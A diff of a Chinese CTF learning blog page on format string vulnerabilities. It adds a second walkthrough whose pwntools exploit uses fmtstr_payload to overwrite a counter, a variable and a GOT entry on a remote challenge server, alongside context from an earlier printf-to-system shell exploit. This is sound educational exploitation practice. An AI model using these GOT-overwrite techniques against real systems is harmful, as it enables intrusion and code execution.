@@ -87,7 +87,9 @@
 <meta property="og:description" content="昨天看了看格式化字符串漏洞的一些基本内容，今天一方面补全了一下知识，另一方面也做了个题目来练手。 覆盖任意地址首先来看看昨天没有搞完的覆盖内存，昨天我们成功覆盖了栈上的内存改变了局部变量c的值，让程序执行到了我们想要的结果，那程序中还有两个变量a、b（a、b为初始化的全局变量，存储在data段，并不在栈上，详情请看上一篇），能不能将他们的值也改变呢？ 当然可以了，这就是我们内存覆盖的第二个方面—任">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxeuemhwz8j30om0g8tb6.jpg">
-<meta property="og:updated_time" content="2018-11-20T13:32:22.972Z">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fxexaabnswj30wm0ekq5s.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fxexeowvb4j30cy06m74u.jpg">
+<meta property="og:updated_time" content="2018-11-20T15:12:38.572Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwn学习（5）格式化字符串漏洞2">
 <meta name="twitter:description" content="昨天看了看格式化字符串漏洞的一些基本内容，今天一方面补全了一下知识，另一方面也做了个题目来练手。 覆盖任意地址首先来看看昨天没有搞完的覆盖内存，昨天我们成功覆盖了栈上的内存改变了局部变量c的值，让程序执行到了我们想要的结果，那程序中还有两个变量a、b（a、b为初始化的全局变量，存储在data段，并不在栈上，详情请看上一篇），能不能将他们的值也改变呢？ 当然可以了，这就是我们内存覆盖的第二个方面—任">
@@ -376,7 +378,7 @@ p.interactive()
     return info
 autofmt = FmtStr(getoffset)
 print autofmt.offset
-</code></pre><h2 id="题目实战"><a href="#题目实战" class="headerlink" title="题目实战"></a>题目实战</h2><p>题目是来自iscc2017的第一道pwn题，链接就不放了，很容易找到，还是老规矩，首先拿ida分析一波</p>
+</code></pre><h2 id="题目实战1"><a href="#题目实战1" class="headerlink" title="题目实战1"></a>题目实战1</h2><p>题目是来自iscc2017的第一道pwn题，链接就不放了，很容易找到，还是老规矩，首先拿ida分析一波</p>
 <p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxeuemhwz8j30om0g8tb6.jpg" alt=""></p>
 <p>可以看到在我们输入name后有一个很明显的格式化字符串漏洞。而在程序中没有可以供我们利用的/bin/sh字符串和system函数，那我们就要考虑人为的创造他们了。</p>
 <p>/bin/sh字符串好说，因为程序存在输入，我们完全可以直接写进去，但system函数怎么办呢？前面说了利用这个漏洞我们可以实现任意地址的泄漏和写入，那我们可以首先泄漏某个函数的libc地址，然后计算出system的地址写入（因为got表表是可写的）之前的那个函数，这就相当于把之前的函数“变成”了system，拿选谁比较合适呢？当然是printf了，因为printf的参数恰好就是我们输入的字符，那我们把printf代替之后就可以直接执行system(“/bin/sh”)了</p>
@@ -411,7 +413,28 @@ p.recvuntil(&apos;please input your name:\n&apos;)
 p.sendline(&apos;/bin/sh\0&apos;)
 
 p.interactive()
-</code></pre>
+</code></pre><h2 id="题目实战2"><a href="#题目实战2" class="headerlink" title="题目实战2"></a>题目实战2</h2><p>第二个例题是2018山东省赛的pwn的铜牌题目，题目在学校的平台上有，难度不是很大，首先还是ida看一下</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxexaabnswj30wm0ekq5s.jpg" alt=""></p>
+<p>可以看到很明显是格式化字符串漏洞，再看一下题目还给个getFlag函数能直接显示flag，不过想要执行这个函数还需要number等于0x2018</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxexeowvb4j30cy06m74u.jpg" alt=""></p>
+<p>那思路就有了，我们可以首先改写计数器total count来多次执行这个漏洞，紧接着再利用任意地址覆盖使得number变为0x2018</p>
+<p>最后我们找个getFlag函数的“替身”，这里我们可以看到选择</p>
+<p>当然在做这些之前还是需要找到偏移的，可以手动也可以直接用之前自动化的脚本，最后的exp如下：</p>
+<pre><code>from pwn import *
+p = remote(&quot;47.105.148.65&quot;,9999)
+count_addr = 0x804A064
+num_addr = 0x804A060
+put_addr = 0x804A01C
+flag_addr = 0x8048616
+payload = fmtstr_payload(4,{count_addr:0x3})
+p.sendline(payload)
+payload = fmtstr_payload(4,{num_addr:0x2018})
+p.sendline(payload)
+payload = fmtstr_payload(4,{put_addr:flag_addr})
+p.sendline(payload)
+p.interactive()
+</code></pre><p>successful</p>
+
       
     </div>
     
@@ -566,7 +589,7 @@ p.interactive()
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#覆盖任意地址"><span class="nav-number">1.</span> <span class="nav-text">覆盖任意地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#覆盖小数字"><span class="nav-number">1.1.</span> <span class="nav-text">覆盖小数字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#覆盖大数字"><span class="nav-number">1.2.</span> <span class="nav-text">覆盖大数字</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#自动化寻找偏移值"><span class="nav-number">2.</span> <span class="nav-text">自动化寻找偏移值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目实战"><span class="nav-number">3.</span> <span class="nav-text">题目实战</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#覆盖任意地址"><span class="nav-number">1.</span> <span class="nav-text">覆盖任意地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#覆盖小数字"><span class="nav-number">1.1.</span> <span class="nav-text">覆盖小数字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#覆盖大数字"><span class="nav-number">1.2.</span> <span class="nav-text">覆盖大数字</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#自动化寻找偏移值"><span class="nav-number">2.</span> <span class="nav-text">自动化寻找偏移值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目实战1"><span class="nav-number">3.</span> <span class="nav-text">题目实战1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目实战2"><span class="nav-number">4.</span> <span class="nav-text">题目实战2</span></a></li></ol></div>
             
 
           </div>
